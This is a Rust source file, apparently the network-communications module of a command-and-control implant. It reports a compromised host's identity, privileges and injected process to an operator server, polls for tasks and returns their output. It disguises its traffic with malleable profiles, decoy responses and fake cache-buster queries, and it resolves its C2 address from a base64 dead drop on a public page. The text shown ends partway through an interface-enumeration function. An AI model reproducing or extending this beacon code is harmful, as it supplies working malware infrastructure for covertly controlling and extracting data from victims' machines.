use crate::core_agent::{cryptography::crypto, management::config::AgentConfig, exec::TaskResult};
use serde::{Serialize, Deserialize};
use std::io::{Read, BufReader};
use std::net::UdpSocket;
use std::sync::Arc;

// TLS imports - using ureq::rustls (no native_tls!)
use ureq::rustls::client::danger::{ServerCertVerifier, ServerCertVerified, HandshakeSignatureValid};
use ureq::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use ureq::rustls::{DigitallySignedStruct, SignatureScheme, ClientConfig, RootCertStore};
use rustls_pemfile::certs;

#[derive(Serialize, Deserialize, Debug)]
pub struct Envelope {
    #[serde(rename = "type")]
    pub msg_type: String,
    #[serde(rename = "session_id")]
    pub session_id: String,
    pub data: serde_json::Value,
    pub ts: i64,
}

#[derive(Serialize, Deserialize)]
struct CheckinReq {
    #[serde(rename = "session_id")]
    session_id: String,
    hostname: String,
    username: String,
    os: String,
    arch: String,
    pid: u32,
    #[serde(rename = "is_admin")]
    is_admin: bool,
    // v9: operator dashboard columns — the AGENT's own truth (not the
    // server-seen TCP peer). internal_ip = interface IP that routes to the
    // C2/redirector; process/parent = the process the beacon lives in
    // ("explorer.exe" after injection, own image when standalone); privs =
    // "system" | "admin" | "user". All three feed the Sessions table.
    #[serde(rename = "internal_ip")]
    internal_ip: String,
    process: String,
    #[serde(rename = "parent_process")]
    parent_process: String,
    privs: String,
    salt: String,
    #[serde(rename = "psk_hash")]
    psk_hash: String,
    #[serde(rename = "trust_score")]
    trust_score: i32,
    #[serde(rename = "sleep_time")]
    sleep_time: u32,
    jitter: f64,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ServerResponse {
    #[serde(rename = "session_id")]
    pub session_id: String,
    pub tasks: Option<Vec<WireTask>>,
    #[serde(rename = "fast_poll")]
    pub fast_poll: Option<bool>,
}

/// TaskBatch — tasks + fast_poll hint returned by every server interaction.
#[derive(Debug, Clone, Default)]
pub struct TaskBatch {
    pub tasks: Vec<WireTask>,
    pub fast_poll: bool,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct WireTask {
    pub id: String,
    #[serde(rename = "type")]
    pub task_type: String,
    pub command: String,
    pub args: serde_json::Value,
}

#[derive(Serialize, Deserialize)]
pub struct TaskResultWire {
    #[serde(rename = "task_id")]
    pub task_id: String,
    pub output: String,
    pub error: String,
    pub success: bool,
}

// Session state — lives across beacon iterations
//
// BUGFIX (Bug #7 — Box::leak Memory Leak): the original `config` field
// was `&'static AgentConfig`, and set_fallback() leaked a new
// AgentConfig on every host rotation via `Box::leak(Box::new(c))`.
// 10 rotations = 10 permanent leaks, each ~2KB plus all the &'static
// str fields. On long ops with aggressive rotation that adds up.
//
// FIX: `config: Arc<AgentConfig>`. set_fallback() does
//   let mut c = (*self.config).clone();
//   c.c2_host = host; c.c2_port = port;
//   self.config = Arc::new(c);
// The old Arc drops when refcount = 0 → no leak. The AgentConfig's
// `&'static str` fields (made by the leak() helper in config.rs) are
// baked-in for the agent's lifetime and never need freeing.
pub struct Session {
    pub session_id: String,
    pub crypto: Option<crypto::SessionCrypto>,  // FIX: Option instead of unsafe zeroed
    pub config: Arc<AgentConfig>,  // Bug #7: was &'static — leaked on rotation
    pub checked_in: bool,
    crypto_ready: bool,
}

impl Session {
    pub fn new(cfg: Arc<AgentConfig>) -> Option<Self> {
        crate::core_agent::debug_log("[SESSION] Creating new session...");
        if cfg.encryption_key.is_empty() {
            crate::core_agent::debug_log("[SESSION] FATAL: encryption_key is EMPTY");
            return None;
        }
        let psk_bytes = crypto::hex_decode(cfg.encryption_key)?;
        if psk_bytes.len() != 32 {
            crate::core_agent::debug_log(&format!("[SESSION] FATAL: encryption_key decoded to {} bytes, expected 32", psk_bytes.len()));
            return None;
        }
        crate::core_agent::debug_log(&format!("[SESSION] PSK decoded OK ({} bytes), session created", psk_bytes.len()));
        Some(Self {
            session_id: String::new(),
            crypto: None,  // Safe initialization
            config: cfg,   // takes ownership of the Arc (clone of the caller's Arc)
            checked_in: false,
            crypto_ready: false,
        })
    }

    // Helper to get crypto safely
    fn get_crypto(&self) -> Result<&crypto::SessionCrypto, String> {
        self.crypto.as_ref().ok_or_else(|| "Crypto not initialized".to_string())
    }

    /// Switch agent to another C2 host (v3 rotation / legacy fallback).
    /// Called by the beacon loop when the current host dies after max_retries.
    /// v3: clones the FULL config (derives Clone) instead of the old
    /// field-by-field copy — the old version silently DROPPED kill_hostname,
    /// kill_username, initial_delay_*, fallback_host/port on every hop.
    ///
    /// Bug #7 fix: replaced `Box::leak(Box::new(c))` with `Arc::new(c)` —
    /// the previous rotation's Arc drops when refcount = 0, so no leak.
    pub fn set_fallback(&mut self, host: &'static str, port: u16) {
        crate::core_agent::debug_log(&format!(
            "[COMMS] Switching to C2 host index rotation (port {})", port
        ));
        let mut c = (*self.config).clone();  // deep clone of AgentConfig (Copy fields + &'static str)
        c.c2_host = host;
        c.c2_port = port;
        self.config = Arc::new(c);  // old Arc drops when refcount = 0 — NO LEAK
        // Force re-checkin with new host
        self.checked_in = false;
    }

    /// v3: build the base URL for the current config (proto://host[:port]).
    fn base_url(&self) -> String {
        let is_std_port = (self.config.c2_protocol == "https" && self.config.c2_port == 443)
            || (self.config.c2_protocol == "http" && self.config.c2_port == 80);
        if is_std_port {
            format!("{}://{}", self.config.c2_protocol, self.config.c2_host)
        } else {
            format!("{}://{}:{}", self.config.c2_protocol, self.config.c2_host, self.config.c2_port)
        }
    }

    /// v3: GET-poll heartbeat (malleable poll_mode=get).
    /// Requests GET {base}{get_endpoint}?v=<8-char session prefix> — the
    /// query param reads as a cache-buster (jquery.min.js?v=ec54d58c style).
    /// Response: when tasks exist the body is [prefix8][encrypted envelope];
    /// otherwise the server returns a plain decoy body (no high-entropy blob
    /// on the wire when there is nothing to say).
    pub fn poll_get(&self) -> Result<TaskBatch, String> {
        if !self.checked_in {
            return Ok(TaskBatch::default());
        }
        let profile = crate::core_agent::management::profile::get();
        let get_uri: String = profile
            .as_ref()
            .and_then(|p| p.get_endpoint.clone())
            .filter(|s| !s.is_empty())
            .unwrap_or_else(|| self.config.get_endpoint.to_string());
        if get_uri.is_empty() {
            // No GET endpoint configured anywhere — silently fall back to POST.
            return self.heartbeat();
        }
        let crypto = self.get_crypto()?;
        let prefix = self.session_id.as_bytes().get(..8).unwrap_or(&[]).to_vec();
        let url = format!("{}{}?v={}", self.base_url(), get_uri,
            String::from_utf8_lossy(&prefix));
        crate::core_agent::debug_log(&format!("[GETPOLL] GET {} ({} bytes body expected)", url, 0));

        let user_agent: &str = profile
            .as_ref()
            .and_then(|p| p.user_agent.as_deref())
            .unwrap_or(self.config.user_agent);

        let agent = if !self.config.ca_cert_pem.is_empty() {
            build_pinned_agent(self.config.ca_cert_pem, user_agent)?
        } else {
            #[cfg(debug_assertions)]
            {
                ureq::AgentBuilder::new()
                    .timeout(std::time::Duration::from_secs(30))
                    .user_agent(user_agent)
                    .tls_connector(Arc::new(build_noverify_tls()))
                    .build()
            }
            #[cfg(not(debug_assertions))]
            {
                return Err("Production build missing ca_cert_pem — refusing to connect without TLS pinning".to_string());
            }
        };

        let mut req = agent.get(&url);
        // GET-dialect headers (v4): when the profile carries get_headers they
        // are applied here; otherwise fall back to the POST header set
        // (pre-v4 behaviour). Either way minus Content-Type/Host — a GET
        // carrying Content-Type is itself a fingerprint. Names/values are
        // already validated.
        if let Some(p) = profile.as_ref() {
            let src: &[(String, String)] =
                if p.get_headers.is_empty() { &p.headers } else { &p.get_headers };
            for (k, v) in src {
                if k.eq_ignore_ascii_case("content-type") { continue; }
                if k.eq_ignore_ascii_case("host") { continue; }
                req = req.set(k.as_str(), v.as_str());
            }
        } else {
            req = req
                .set("Accept", "*/*")
                .set("Accept-Language", "en-US,en;q=0.5");
        }
        let resp = req.call().map_err(|e| format!("get-poll request: {}", e))?;
        let status = resp.status();
        if !(200..300).contains(&status) {
            return Err(format!("get-poll http {}", status));
        }
        let mut body = Vec::new();
        resp.into_reader().read_to_end(&mut body).map_err(|e| format!("get-poll read: {}", e))?;
        if body.len() > prefix.len() && body[..prefix.len()] == prefix[..] {
            let resp_raw = &body[prefix.len()..];
            let resp_plain = crypto.decrypt_from_server(resp_raw)
                .ok_or_else(|| String::from("decrypt get-poll failed"))?;
            let resp_env: Envelope = serde_json::from_slice(&resp_plain)
                .map_err(|e| format!("bad get-poll envelope: {}", e))?;
            self.parse_tasks(&resp_env)
        } else {
            // Decoy body — nothing to do this cycle.
            Ok(TaskBatch::default())
        }
    }

    pub fn checkin(&mut self, hostname: &str, username: &str, os_info: &SysInfo) -> Result<TaskBatch, String> {
        crate::core_agent::debug_log("[CHECKIN] Starting checkin...");
        let psk_hash = crypto::psk_hash_hex(self.config.encryption_key);
        let salt = crypto::generate_salt_hex();
        crate::core_agent::debug_log(&format!("[CHECKIN] psk_hash={}... salt={}...", &psk_hash[..16.min(psk_hash.len())], &salt[..16.min(salt.len())]));

        let derived = crypto::SessionCrypto::derive(self.config.encryption_key, &salt);
        match &derived {
            Some(_) => crate::core_agent::debug_log("[CHECKIN] Crypto derived OK"),
            None => {
                crate::core_agent::debug_log("[CHECKIN] FATAL: key derivation failed");
                return Err("key derivation failed".into());
            }
        }
        self.crypto = Some(derived.unwrap());
        self.crypto_ready = true;

        let checkin = CheckinReq {
            session_id: String::new(),
            hostname: hostname.to_string(),
            username: username.to_string(),
            os: os_info.os.clone(),
            arch: os_info.arch.clone(),
            pid: os_info.pid,
            is_admin: os_info.is_admin,
            internal_ip: os_info.internal_ip.clone(),
            process: os_info.process.clone(),
            parent_process: os_info.parent_process.clone(),
            privs: os_info.privs.clone(),
            salt,
            psk_hash,
            trust_score: 70,
            sleep_time: self.config.sleep_ms / 1000,
            jitter: self.config.jitter_ms as f64 / 1000.0 / (self.config.sleep_ms as f64 / 1000.0),
        };

        let env = Envelope {
            msg_type: "checkin".into(),
            session_id: String::new(),
            data: serde_json::to_value(&checkin).map_err(|e| e.to_string())?,
            ts: epoch(),
        };

        let payload = serde_json::to_vec(&env).map_err(|e| {
            crate::core_agent::debug_log(&format!("[CHECKIN] JSON serialize failed: {}", e));
            e.to_string()
        })?;
        crate::core_agent::debug_log(&format!("[CHECKIN] Checkin payload {} bytes, sending...", payload.len()));

        let resp_raw = self.send_http(&payload)?;
        crate::core_agent::debug_log(&format!("[CHECKIN] Got response: {} bytes", resp_raw.len()));

        let crypto = self.get_crypto()?;
        let resp_plain = crypto.decrypt_from_server(&resp_raw);
        match &resp_plain {
            Some(data) => crate::core_agent::debug_log(&format!("[CHECKIN] Decrypt OK: {} bytes", data.len())),
            None => {
                crate::core_agent::debug_log("[CHECKIN] FATAL: decrypt response failed");
                return Err("decrypt checkin response failed".into());
            }
        }
        let resp_plain = resp_plain.unwrap();

        let resp_env: Envelope = serde_json::from_slice(&resp_plain)
            .map_err(|e| format!("bad response: {}", e))?;

        if !resp_env.session_id.is_empty() {
            self.session_id = resp_env.session_id.clone();
            crate::core_agent::debug_log(&format!("[CHECKIN] Session assigned: {}", self.session_id));
        } else {
            crate::core_agent::debug_log("[CHECKIN] WARNING: server returned empty session_id");
        }
        self.checked_in = true;
        crate::core_agent::debug_log(&format!("[CHECKIN] SUCCESS — tasks: {}", resp_env.data.get("tasks").and_then(|t| t.as_array()).map(|a| a.len()).unwrap_or(0)));
        self.parse_tasks(&resp_env)
    }

    pub fn heartbeat(&self) -> Result<TaskBatch, String> {
        if !self.checked_in {
            crate::core_agent::debug_log("[HEARTBEAT] Skipped — not checked in yet");
            return Ok(TaskBatch::default());
        }
        crate::core_agent::debug_log(&format!("[HEARTBEAT] Sending heartbeat (session: {}...)", &self.session_id[..8.min(self.session_id.len())]));

        let crypto = self.get_crypto()?;
        let env = Envelope {
            msg_type: "heartbeat".into(),
            session_id: self.session_id.clone(),
            data: serde_json::Value::Null,
            ts: epoch(),
        };
        let payload = serde_json::to_vec(&env).map_err(|e| e.to_string())?;
        let encrypted = crypto.encrypt_to_server(&payload);

        // Prepend 8-char session ID prefix for O(1) server routing.
        // Server reads first 8 bytes → map lookup → single decrypt attempt.
        // Without prefix, server falls back to O(n) scan of all sessions.
        let prefix = self.session_id.as_bytes().get(..8).unwrap_or(&[]);
        let mut wire_with_prefix = Vec::with_capacity(prefix.len() + encrypted.len());
        wire_with_prefix.extend_from_slice(prefix);
        wire_with_prefix.extend_from_slice(&encrypted);

        let resp_raw = self.send_http(&wire_with_prefix)?;
        let resp_plain = crypto.decrypt_from_server(&resp_raw)
            .ok_or_else(|| String::from("decrypt heartbeat failed"))?;

        let resp_env: Envelope = serde_json::from_slice(&resp_plain)
            .map_err(|e| format!("bad heartbeat: {}", e))?;

        self.parse_tasks(&resp_env)
    }

    pub fn rekey(&mut self, hostname: &str, username: &str) -> Result<TaskBatch, String> {
        crate::core_agent::debug_log("[REKEY] Starting rekey (fresh checkin with new salt)...");
        // REKEY FIX: Previous implementation tried encrypted rekey first,
        // but the server cannot decrypt it because it uses the OLD session
        // crypto. The encrypted attempt always failed (401), then fell
        // through to a plain checkin anyway.
        //
        // New approach: send a PLAIN JSON rekey envelope (same format as
        // initial checkin). Server handles it under handleC2Checkin's JSON
        // path (msg_type == "checkin"), finds PSK, derives NEW crypto,
        // and returns encrypted response. This is clean and reliable.
        //
        // Session ID is cleared so server treats it as a fresh checkin.
        // If server finds existing session by hostname+username, it updates
        // the crypto on that session (FindOrCreateSession handles this).

        self.checked_in = false;
        self.session_id.clear();
        self.crypto = None;

        // Fall through to normal checkin — server will match by PSK hash
        // and either find existing session (update crypto) or create new one.
        self.checkin(hostname, username, &SysInfo::gather())
    }

    pub fn send_results(&self, results: &[TaskResult]) -> Result<(), String> {
        if results.is_empty() { return Ok(()); }

        let crypto = self.get_crypto()?;
        let wire_results: Vec<TaskResultWire> = results.iter().map(|r| {
            TaskResultWire {
                task_id: r.task_id.clone(),
                output: base64_encode(r.output.as_bytes()),
                error: if r.error.is_empty() { String::new() } else { base64_encode(r.error.as_bytes()) },
                success: r.success,
            }
        }).collect();

        let env = Envelope {
            msg_type: "result".into(),
            session_id: self.session_id.clone(),
            data: serde_json::to_value(&wire_results).map_err(|e| e.to_string())?,
            ts: epoch(),
        };

        let payload = serde_json::to_vec(&env).map_err(|e| e.to_string())?;
        let encrypted = crypto.encrypt_to_server(&payload);

        // Prepend 8-char session ID prefix for O(1) server routing.
        let prefix = self.session_id.as_bytes().get(..8).unwrap_or(&[]);
        let mut wire_with_prefix = Vec::with_capacity(prefix.len() + encrypted.len());
        wire_with_prefix.extend_from_slice(prefix);
        wire_with_prefix.extend_from_slice(&encrypted);

        let _ = self.send_http(&wire_with_prefix)?;
        Ok(())
    }

    fn parse_tasks(&self, env: &Envelope) -> Result<TaskBatch, String> {
        let resp: ServerResponse = match serde_json::from_value(env.data.clone()) {
            Ok(r) => r,
            Err(e) => {
                crate::core_agent::debug_log(&format!("[PARSE] FATAL: parse response failed: {}", e));
                return Err(format!("parse response: {}", e));
            }
        };
        let tasks = resp.tasks.unwrap_or_default();
        let fast_poll = resp.fast_poll.unwrap_or(false);
        let task_count = tasks.len();
        if task_count > 0 {
            crate::core_agent::debug_log(&format!(
                "[PARSE] Parsed {} task(s) from server (fast_poll={})",
                task_count, fast_poll
            ));
        }
        Ok(TaskBatch { tasks, fast_poll })
    }

    fn send_http(&self, payload: &[u8]) -> Result<Vec<u8>, String> {
        // ── Malleable profile consult (runtime + baked) ────────────────────
        // The profile can override the POST URI, the User-Agent and the fixed
        // header set. Everything falls back to the baked config when no
        // profile is active (None = default dialect).
        let profile = crate::core_agent::management::profile::get();
        let endpoint: &str = profile
            .as_ref()
            .and_then(|p| p.endpoint.as_deref())
            .unwrap_or(self.config.c2_endpoint);
        let user_agent: &str = profile
            .as_ref()
            .and_then(|p| p.user_agent.as_deref())
            .unwrap_or(self.config.user_agent);
        let is_std_port = (self.config.c2_protocol == "https" && self.config.c2_port == 443)
            || (self.config.c2_protocol == "http" && self.config.c2_port == 80);
        let url = if is_std_port {
            format!("{}://{}{}", self.config.c2_protocol, self.config.c2_host, endpoint)
        } else {
            format!("{}://{}:{}{}", self.config.c2_protocol, self.config.c2_host, self.config.c2_port, endpoint)
        };
        crate::core_agent::debug_log(&format!("[HTTP] === SEND_HTTP START ==="));
        crate::core_agent::debug_log(&format!("[HTTP] Target URL: {} ({} bytes payload)", url, payload.len()));
        crate::core_agent::debug_log(&format!("[HTTP] Protocol: {}, Host: {}, Port: {}",
            self.config.c2_protocol, self.config.c2_host, self.config.c2_port));

        // ── TLS Certificate Pinning ──────────────────────────────────────
        // If a CA cert PEM is baked into the agent at build time, use it
        // to pin the server's certificate. Only our CA's certs will be
        // accepted — MITM is impossible even with a rogue trusted CA.
        // ─────────────────────────────────────────────────────────────────
        crate::core_agent::debug_log(&format!("[HTTP] TLS setup: ca_cert_pem is {} bytes", self.config.ca_cert_pem.len()));
        crate::core_agent::debug_log(&format!("[HTTP] TLS setup: agent_cert_pem is {} bytes", self.config.agent_cert_pem.len()));
        crate::core_agent::debug_log(&format!("[HTTP] TLS setup: agent_key_pem is {} bytes", self.config.agent_key_pem.len()));

        let agent = if !self.config.ca_cert_pem.is_empty() {
            crate::core_agent::debug_log("[HTTP] Building pinned TLS agent (CA cert provided)...");
            match build_pinned_agent(self.config.ca_cert_pem, user_agent) {
                Ok(a) => {
                    crate::core_agent::debug_log("[HTTP] Pinned TLS agent created OK");
                    a
                }
                Err(e) => {
                    crate::core_agent::debug_log(&format!("[HTTP] FATAL: TLS pin setup failed: {}", e));
                    return Err(format!("TLS pin setup failed: {} — aborting (will not connect insecurely)", e));
                }
            }
        } else {
            crate::core_agent::debug_log("[HTTP] WARNING: ca_cert_pem empty");
            // Production safety check: NEVER allow insecure fallback in release builds.
            #[cfg(debug_assertions)]
            {
                crate::core_agent::debug_log("[HTTP] Dev mode: TLS verification DISABLED");
                ureq::AgentBuilder::new()
                    .timeout(std::time::Duration::from_secs(30))
                    .user_agent(user_agent)
                    .tls_connector(Arc::new(build_noverify_tls()))
                    .build()
            }
            #[cfg(not(debug_assertions))]
            {
                crate::core_agent::debug_log("[HTTP] FATAL: Production build missing ca_cert_pem — refusing insecure connection");
                return Err("Production build missing ca_cert_pem — refusing to connect without TLS pinning".to_string());
            }
        };

        // ── HTTP POST — the actual network call ───────────────────────────
        // This is where DNS, TCP, TLS handshake, and HTTP all happen.
        // If it hangs here, the 30s timeout should fire.
        // If it panics, catch_unwind will capture it.
        // ─────────────────────────────────────────────────────────────────
        crate::core_agent::debug_log("[HTTP] Initiating POST request (DNS → TCP → TLS → HTTP)...");
        crate::core_agent::debug_log(&format!("[HTTP] Headers: Content-Type=application/octet-stream, Accept=*, User-Agent={}...",
            &user_agent[..50.min(user_agent.len())]));

        // ── Header set: profile headers (if active) else built-in defaults ─
        // Content-Type must always be present (server expects a binary body).
        let mut post = agent.post(&url);
        match profile.as_ref().filter(|p| !p.headers.is_empty()) {
            Some(p) => {
                let mut has_ct = false;
                for (k, val) in &p.headers {
                    if k.eq_ignore_ascii_case("content-type") { has_ct = true; }
                    post = post.set(k.as_str(), val.as_str());
                }
                if !has_ct {
                    post = post.set("Content-Type", "application/octet-stream");
                }
            }
            None => {
                post = post
                    .set("Content-Type", "application/octet-stream")
                    .set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
                    .set("Accept-Language", "en-US,en;q=0.5")
                    .set("Cache-Control", "no-cache");
            }
        }
        let resp = match post.send_bytes(payload)
        {
            Ok(r) => {
                crate::core_agent::debug_log(&format!("[HTTP] POST completed — status: {}", r.status()));
                r
            }
            Err(e) => {
                // ureq Error — classify it
                let err_str = e.to_string();
                crate::core_agent::debug_log(&format!("[HTTP] POST FAILED — ureq error: {}", err_str));
                if err_str.contains("timeout") || err_str.contains("Timeout") {
                    crate::core_agent::debug_log("[HTTP] DIAGNOSIS: TIMEOUT — server did not respond within 30s");
                    crate::core_agent::debug_log("[HTTP] Possible causes: DNS unreachable, firewall blocking, server down, wrong host/port");
                } else if err_str.contains("certificate") || err_str.contains("Certificate") || err_str.contains("InvalidCertificate") {
                    crate::core_agent::debug_log("[HTTP] DIAGNOSIS: TLS CERTIFICATE FAILURE — server cert not trusted by pinned CA");
                    crate::core_agent::debug_log("[HTTP] Possible causes: CA cert mismatch, server using different cert, cert expired");
                } else if err_str.contains("connect") || err_str.contains("Connect") || err_str.contains("refused") {
                    crate::core_agent::debug_log("[HTTP] DIAGNOSIS: CONNECTION REFUSED — TCP connect failed");
                    crate::core_agent::debug_log("[HTTP] Possible causes: server not listening, firewall, wrong IP/port, DNS resolved to wrong address");
                } else if err_str.contains("dns") || err_str.contains("DNS") || err_str.contains("resolve") {
                    crate::core_agent::debug_log("[HTTP] DIAGNOSIS: DNS RESOLUTION FAILURE");
                    crate::core_agent::debug_log("[HTTP] Possible causes: domain does not exist, no DNS server configured, DNS blocked");
                } else if err_str.contains("TLS") || err_str.contains("tls") || err_str.contains("handshake") {
                    crate::core_agent::debug_log("[HTTP] DIAGNOSIS: TLS HANDSHAKE FAILURE");
                    crate::core_agent::debug_log("[HTTP] Possible causes: cipher suite mismatch, TLS version mismatch, SNI issue");
                } else {
                    crate::core_agent::debug_log(&format!("[HTTP] DIAGNOSIS: UNKNOWN ERROR TYPE — raw: {}", err_str));
                }
                return Err(format!("request: {}", e));
            }
        };

        let status = resp.status();
        crate::core_agent::debug_log(&format!("[HTTP] Processing response: status={}, reading body...", status));
        if !(status >= 200 && status < 300) {
            // Try to read error body for more info
            let mut err_body = Vec::new();
            let _ = resp.into_reader().read_to_end(&mut err_body);
            let err_preview = String::from_utf8_lossy(&err_body);
            crate::core_agent::debug_log(&format!("[HTTP] HTTP {} — server rejected. Body (first 200 chars): {}",
                status, &err_preview[..200.min(err_preview.len())]));
            return Err(format!("http {}", status));
        }

        let mut body = Vec::new();
        if let Err(e) = resp.into_reader().read_to_end(&mut body) {
            crate::core_agent::debug_log(&format!("[HTTP] FATAL: read body failed: {}", e));
            return Err(format!("read body: {}", e));
        }
        crate::core_agent::debug_log(&format!("[HTTP] Response body received: {} bytes", body.len()));
        if body.is_empty() {
            crate::core_agent::debug_log("[HTTP] WARNING: Response body is EMPTY (0 bytes)");
        }
        crate::core_agent::debug_log("[HTTP] === SEND_HTTP COMPLETE ===");
        Ok(body)
    }
}

// ── v3: Dead-drop resolver (MITRE T1102.001) ────────────────────────────────
/// Fetch `url` over public TLS and extract the base64-encoded C2 host sitting
/// between `begin` and `end` markers (e.g. a GitHub README/Gist line:
/// `<!--cfg: Y2RuLnBoYW50b20tZWRnZS5pbzo0NDM= cfg-->`).
/// The agent binary itself carries NO C2 host — infra swap = edit the dead drop.
///
/// OPSEC HARDENING (audit I-CR4 fix):
///   OLD: used ureq::AgentBuilder::new() with default rustls webpki-roots — the
///        agent trusted Mozilla's public root store. Attacker who got a Let's
///        Encrypt cert for raw.githubusercontent.com (trivial) could MITM the
///        dead-drop fetch and feed the agent an attacker-controlled C2 host.
///        Infrastructure pivot takeover via a $0 cert.
///
///   NEW: if `ca_cert_pem` is non-empty, the same pinned-TLS Agent used for
///        checkin is used for dead-drop fetch — only operator's CA trusted,
///        MITM impossible. If `ca_cert_pem` is empty (dev build without a
///        baked CA), we log a warning and fall back to the public root store
///        so lab testing still works — production builds should ALWAYS have
///        ca_cert_pem set (build_handler enforces this).
pub fn resolve_deaddrop(url: &str, begin: &str, end: &str, ca_cert_pem: &str) -> Option<String> {
    if url.is_empty() { return None; }
    let begin = if begin.is_empty() { "<!--cfg:" } else { begin };
    let end   = if end.is_empty()   { "cfg-->" }  else { end };

    // Pinned-TLS path: use the operator's CA cert if baked in.
    // This is the production-safe path — MITM impossible.
    let body = if !ca_cert_pem.is_empty() {
        crate::core_agent::debug_log("[DEADDROP] Using pinned CA for dead-drop fetch");
        let agent = match build_pinned_agent(ca_cert_pem,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36") {
            Ok(a) => a,
            Err(e) => {
                crate::core_agent::debug_log(&format!(
                    "[DEADDROP] FATAL: pinned TLS agent build failed: {}", e));
                return None;
            }
        };
        agent.get(url).call().ok()?.into_string().ok()?
    } else {
        // Fallback path: dev/lab builds without a baked CA. Public root store.
        // NOT for production — log loudly so operator notices.
        crate::core_agent::debug_log(
            "[DEADDROP] WARNING: ca_cert_pem empty — using public root store (NOT production-safe)");
        let agent = ureq::AgentBuilder::new()
            .timeout(std::time::Duration::from_secs(20))
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build();
        agent.get(url).call().ok()?.into_string().ok()?
    };

    let i = body.find(begin)?;
    let s = i + begin.len();
    let j = body[s..].find(end)?;
    let raw = body[s..s + j].trim();
    if raw.is_empty() { return None; }
    let decoded = base64_decode(raw)?;
    let host = String::from_utf8(decoded).ok()?.trim().to_string();
    // Basic host sanity: hostname[:port], no scheme, no path
    if host.is_empty()
        || host.contains("://")
        || host.contains('/')
        || host.len() > 253
        || !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-' || c == ':')
    {
        return None;
    }
    Some(host)
}

// System info gathered at startup for checkin
pub struct SysInfo {
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub pid: u32,
    pub is_admin: bool,
    pub internal_ip: String,
    pub domain: String,
    // v9: dashboard columns — what the beacon lives in and who it runs as
    pub process: String,        // image name of THIS process (explorer.exe after injection)
    pub parent_process: String, // parent image name
    pub privs: String,          // "system" | "admin" | "user"
}

impl SysInfo {
    pub fn gather() -> Self {
        #[cfg(target_os = "windows")]
        {
            use winapi::um::winbase::GetComputerNameW;
            use winapi::um::processthreadsapi::GetCurrentProcessId;

            let mut buf = [0u16; 256];
            let mut size = 256u32;
            unsafe { GetComputerNameW(buf.as_mut_ptr(), &mut size); }
            let hostname = String::from_utf16_lossy(&buf[..size as usize]);
            let username = std::env::var("USERNAME").unwrap_or_default();
            let pid = unsafe { GetCurrentProcessId() };
            let is_admin = check_admin();
            let domain = std::env::var("USERDOMAIN").unwrap_or_default();

            // v9 dashboard truth: local interface IP + owning process chain +
            // privilege level. Everything here is read-only local introspection.
            let internal_ip = internal_ip_win();
            let (process, parent_process) = process_chain_win(pid);
            let privs = privs_string_win(is_admin);

            SysInfo {
                hostname, username,
                os: "windows".into(), arch: std::env::consts::ARCH.to_string(),
                pid, is_admin, internal_ip, domain,
                process, parent_process, privs,
            }
        }
        #[cfg(not(target_os = "windows"))]
        {
            // REAL system info for Unix/Linux
            let hostname = get_hostname_unix();
            let username = std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_else(|_| "unknown".into());
            let os = if cfg!(target_os = "macos") { "macos".into() } else { "linux".into() };
            let arch = std::env::consts::ARCH.to_string();
            let is_admin = is_unix_admin();
            let domain = std::env::var("HOSTNAME").unwrap_or_default(); // fallback
            let internal_ip = internal_ip_unix();
            let process = std::env::current_exe().ok()
                .and_then(|p| p.file_name().map(|s| s.to_string_lossy().into_owned()))
                .unwrap_or_default();
            let privs = if is_admin { "admin".to_string() } else { "user".to_string() };
            SysInfo {
                hostname, username, os, arch,
                pid: std::process::id(), is_admin,
                internal_ip, domain,
                process, parent_process: String::new(), privs,
            }
        }
    }
}

// ── v9 registration enrichment helpers ──────────────────────────────────────

/// The interface IP that actually routes toward the C2 (or redirector).
/// UDP "connect" trick: NO packet is sent — connect() only makes the kernel
/// pick the route/interface; we then read our own socket address. Silent,
/// dependency-free, and it answers exactly the operator's question:
/// "which private IP does this beacon egress from?"
///
/// v10 FIX (operator complaint: "internal IP wrong"):
///   v9 used the UDP-to-8.8.8.8 trick, which returns the primary outbound
///   interface — but if the agent runs inside Docker, the primary outbound
///   interface is the Docker bridge (172.17.0.0/16), NOT the host's LAN IP.
///   v10 walks all interfaces via GetIpAddrTable and prefers the first
///   non-loopback, non-Docker-bridge, non-link-local IPv4 address. Only when
///   nothing better is found does it fall back to the UDP-trick result (so a
///   Docker-only deployment still reports SOMETHING honest).
fn internal_ip_unix() -> String {
    // First: try the IP-hint UDP trick to know what the routing table thinks
    // is the primary outbound interface. We'll use this as a fallback.
    let mut udp_hint: Option<String> = None;
    if let Ok(s) = UdpSocket::bind("0.0.0.0:0") {
        if s.connect("8.8.8.8:53").is_ok() {
            if let Ok(local) = s.local_addr() {
                if !local.ip().is_loopback() {
                    udp_hint = Some(local.ip().to_string());
                }
            }
        }
    }

    // On Windows we can also try GetIpAddrTable for a full interface walk.
    #[cfg(target_os = "windows")]
    {
        if let Some(ip) = internal_ip_win_table() {
            return ip;
        }
    }

    // Fallback chain: UDP hint → empty string
    udp_hint.unwrap_or_default()
}

/// v10 Windows: enumerate all NIC IPv4 addresses via GetIpAddrTable and prefer
/// the first one that looks like a real LAN IP (not loopback, not Docker
/// bridge, not link-local 169.254.x.x, not VPN tunnel 172.1[6-9]/172.2[0-9]/172.3[01]).
#[cfg(target_os = "windows")]
fn internal_ip_win_table() -> Option<String> {
    #[link(name = "iphlpapi")]
    extern "system" {
        fn GetIpAddrTable(table: *mut u8, size: *mut u32, order: u32) -> u32;
    }

    unsafe {
        let mut size: u32 = 0;
        // First call: get required size.
        GetIpAddrTable(std::ptr::null_mut(), &mut size, 0);
        if size == 0 || size > 1024 * 1024 { return None; }
        let mut buf = vec![0u8; size as usize];
        let rc = GetIpAddrTable(buf.as_mut_ptr(), &mut size, 0);
        if rc != 0 { return None; }

        // MIB_IPADDRTABLE layout: DWORD dwNumEntries + MIB_IPADDRROW[]
        // MIB_IPADDRROW: DWORD Addr, DWORD Index, DWORD Mask, DWORD BCastAddr, DWORD ReasmSize
        // = 20 bytes per row.
        let n = *(buf.as_ptr() as *const u32);
